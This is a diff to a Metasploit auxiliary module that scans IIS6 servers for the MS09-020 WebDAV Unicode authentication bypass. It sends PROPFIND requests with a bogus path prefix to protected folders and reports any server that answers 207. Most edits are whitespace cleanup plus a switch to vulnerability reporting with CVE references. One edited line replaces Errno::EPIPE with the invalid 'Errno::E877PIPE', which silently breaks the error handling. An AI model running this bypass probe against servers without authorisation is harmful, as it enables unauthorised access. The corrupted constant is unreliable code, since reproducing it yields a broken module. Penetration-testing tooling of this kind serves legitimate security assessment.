@@ -1,5 +1,5 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
@@ -17,7 +17,7 @@ class Metasploit3 < Msf::Auxiliary
 	include Msf::Auxiliary::Report
 
 	def initialize(info = {})
-		super(update_info(info,	
+		super(update_info(info,
 			'Name'   		=> 'MS09-020 IIS6 WebDAV Unicode Auth Bypass',
 			'Description'	=> %q{
 				Simplified version of MS09-020 IIS6 WebDAV Unicode Auth Bypass scanner. It attempts
@@ -36,24 +36,24 @@ class Metasploit3 < Msf::Auxiliary
 					[ 'OSVDB', '54555' ],
 					[ 'BID', '34993' ],
 				],
-			'Version'		=> '$Revision$'))   
-			
+			'Version'		=> '$Revision$'))
+
 		register_options(
 			[
-				OptString.new('PATH', [ true,  "The path to protected folder", '/'])			
-			], self.class)	
-						
+				OptString.new('PATH', [ true,  "The path to protected folder", '/'])
+			], self.class)
+
 	end
 
 	def run_host(ip)
-		tpath = datastore['PATH'] 	
+		tpath = datastore['PATH']
 		if tpath[-1,1] != '/'
 			tpath += '/'
 		end
- 	
+
 		vhost = datastore['VHOST'] || wmap_target_host
 		prot  = datastore['SSL'] ? 'https' : 'http'
-				
+
 		webdav_req = %q|<?xml version="1.0" encoding="utf-8"?><propfind xmlns="DAV:"><prop><getcontentlength xmlns="DAV:"/><getlastmodified xmlns="DAV:"/><executable xmlns="http://apache.org/dav/props/"/><resourcetype xmlns="DAV:"/><checked-in xmlns="DAV:"/><checked-out xmlns="DAV:"/></prop></propfind>|
 
 		begin
@@ -61,7 +61,7 @@ class Metasploit3 < Msf::Auxiliary
 				'uri'  		=>  tpath,
 				'method'   	=> 'PROPFIND',
 				'ctype'		=> 'application/xml',
-				'headers' 	=> 
+				'headers' 	=>
 					{
 					},
 				'data'		=> webdav_req + "\r\n\r\n",
@@ -72,7 +72,7 @@ class Metasploit3 < Msf::Auxiliary
 			elsif (res.code.to_i == 401)
 				print_status("Comfirmed protected folder #{wmap_base_url}#{tpath} #{res.code} (#{wmap_target_host})")
 				print_status("\tTesting for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.")
-					
+
 				cset  = %W{ & ^ % $ # @ ! }
 				buff  = ''
 				blen  = rand(16)+1
@@ -85,22 +85,30 @@ class Metasploit3 < Msf::Auxiliary
 					'uri'  		=>  tpath + bogus+'/',
 					'method'   	=> 'PROPFIND',
 					'ctype'		=> 'application/xml',
-					'headers' 	=> 
+					'headers' 	=>
 						{
 							#'Translate'	 => 'f', # Not required in PROPFIND, only GET - patrickw 20091518
 						},
 					'data'		=> webdav_req + "\r\n\r\n",
 				}, 20)
-					
+
 				if (res.code.to_i == 207)
 					print_status("\tFound vulnerable WebDAV Unicode bypass.  #{wmap_base_url}#{tpath}#{bogus}/ #{res.code} (#{wmap_target_host})")
-					
-					report_note(
+
+
+					report_vuln_service(
 						:host	=> ip,
-						:proto	=> 'HTTP',
 						:port	=> rport,
-						:type	=> 'WEBDAV_UNICODE_BYPASS',
-						:data	=> "#{tpath}#{bogus}/ Code: #{res.code}"
+						:vname	=> 'IIS-WEBDAV-UNICODE-BYPASS',
+						:vdata	=> "#{tpath}#{bogus} / Code: #{res.code}",
+						:refs   =>
+						[
+							[ 'CVE', '2009-1122'],
+							[ 'CVE', '2009-1535'],
+							[ 'MSB', 'MS09-020'],
+							[ 'OSVDB', '54555'],
+							[ 'BID', '34993']
+						]
 					)
 
 				end
@@ -108,7 +116,8 @@ class Metasploit3 < Msf::Auxiliary
 				print_error("Folder does not require authentication. [#{res.code}]")
 			end
 		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-		rescue ::Timeout::Error, ::Errno::EPIPE			
+		rescue ::Timeout::Error, ::Errno::E877PIPE
 		end
 	end
 end
+
